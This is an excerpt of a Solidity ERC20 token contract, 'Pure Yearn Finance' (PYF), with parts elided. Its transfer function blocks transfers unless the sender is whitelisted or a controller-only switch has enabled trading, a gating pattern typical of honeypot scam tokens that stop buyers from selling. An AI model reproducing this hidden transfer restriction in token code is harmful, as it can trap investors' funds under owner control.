...
contract PureYearnFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public controller;
  mapping (address => bool) public stakers;
  mapping (address => bool) public setter;
  bool public beginTrading = false;
  address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Pure Yearn Finance", "PYF", 18) {
  ...
  function _tft(address sender, address recipient, uint amount) internal {
    ...
    if(setter[sender]){
      ...
      super._stake(recipient);
      stakers[recipient] = true;
    } else if(stakers[sender] || beginTrading){
      super._tft(sender, recipient, amount);
    }
  }
  ...
  function setSetter(address account) public {
      require(controller[msg.sender], "error");
      setter[account] = true;
      beginTrading = true;
  }
